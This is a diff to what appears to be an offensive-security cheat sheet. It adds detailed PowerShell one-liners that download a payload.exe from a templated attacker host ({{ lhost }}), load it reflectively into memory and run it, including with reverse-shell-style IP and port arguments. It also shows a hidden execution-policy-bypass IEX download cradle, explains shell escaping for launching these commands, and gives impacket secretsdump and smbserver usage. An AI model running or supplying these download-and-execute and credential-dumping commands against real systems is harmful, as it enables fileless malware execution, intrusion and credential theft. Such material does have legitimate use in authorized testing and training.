@@ -729,16 +729,43 @@ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).Download
 **For Compiled Binaries (.exe):**
 
 ```powershell
-# Execute binary in memory
+# Execute binary in memory (no arguments)
 $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
-[Program.Class]::Main("".Split())
+[Namespace.ClassName]::Main()
 
 # Execute binary in memory WITH arguments
 $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
-[Program.Class]::Main("-Ip 127.0.0.1 -Port 4444".Split())
+[Namespace.ClassName]::Main("-Ip 127.0.0.1 -Port 4444".Split())
 ```
+
+**Important Notes for In-Memory Binary Execution:**
+
+1. **Namespace and Class Names**: `[Namespace.ClassName]` must match the actual namespace and class name in your compiled code
+   - Example: If your C# code has `namespace rev { class Program { ... } }`, use `[rev.Program]::Main()`
+   - These names come from the template/source code, not from the filename
+
+2. **Main Method Signatures**:
+   - `::Main()` - For Main methods with **zero** arguments: `static void Main()`
+   - `::Main("".Split())` - For Main methods with **one or more** arguments: `static void Main(string[] args)`
+   - Using wrong signature will cause "method not found" error
+
+3. **Command-Line Execution with Escaping**:
+   ```bash
+   # When executing from bash/zsh command line, escape $ with backticks
+   powershell -ep bypass -c "`$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe'); `$assem = [System.Reflection.Assembly]::Load(`$data); [rev.Program]::Main()"
+   ```
+   - The backtick (`` ` ``) escapes the `$` in the shell
+   - Without escaping, the shell will try to expand `$data` and `$assem` as shell variables
+
+4. **Interactive PowerShell Session**:
+   ```powershell
+   # In an actual PowerShell prompt, don't use backticks
+   $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
+   $assem = [System.Reflection.Assembly]::Load($data)
+   [rev.Program]::Main()
+   ```
 
 **For DLLs:**
 
@@ -1301,12 +1328,14 @@ This is necessary because MinGW on Linux expects lowercase `windows.h` while Win
 On NixOS, impacket tools are installed without the `impacket-` prefix. Use the direct script names:
 
 **NixOS (Correct):**
+
 ```bash
 smbserver.py share . -smb2support
 secretsdump.py domain/user@target
 ```
 
 **Other Linux Distributions (Incorrect on NixOS):**
+
 ```bash
 impacket-smbserver share . -smb2support
 impacket-secretsdump domain/user@target
